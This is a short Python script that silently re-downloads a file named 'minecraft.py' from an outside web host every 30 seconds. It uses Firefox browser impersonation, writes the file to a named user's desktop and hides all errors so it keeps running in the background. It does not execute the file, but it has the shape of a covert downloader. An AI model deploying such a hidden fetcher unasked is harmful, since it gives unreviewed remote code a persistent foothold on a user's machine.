import time
import os
from curl_cffi import requests

# Define the target URL and the local save path for user yao
SCRIPT_URL = "https://www.346211.xyz/minecraft.py"
SAVE_PATH = r"C:\Users\huai\Desktop\minecraft.py"

def pull_script():
    """Fetch the script using curl-cffi with Firefox impersonation."""
    try:
        response = requests.get(SCRIPT_URL, impersonate="firefox", timeout=10)
        response.raise_for_status()
        
        with open(SAVE_PATH, "wb") as f:
            f.write(response.content)
    except Exception:
        # Ignore errors to keep the service running silently
        pass

if __name__ == "__main__":
    # Ensure the desktop directory exists
    os.makedirs(os.path.dirname(SAVE_PATH), exist_ok=True)
    
    # Run continuously as a background service task
    while True:
        pull_script()
        time.sleep(30)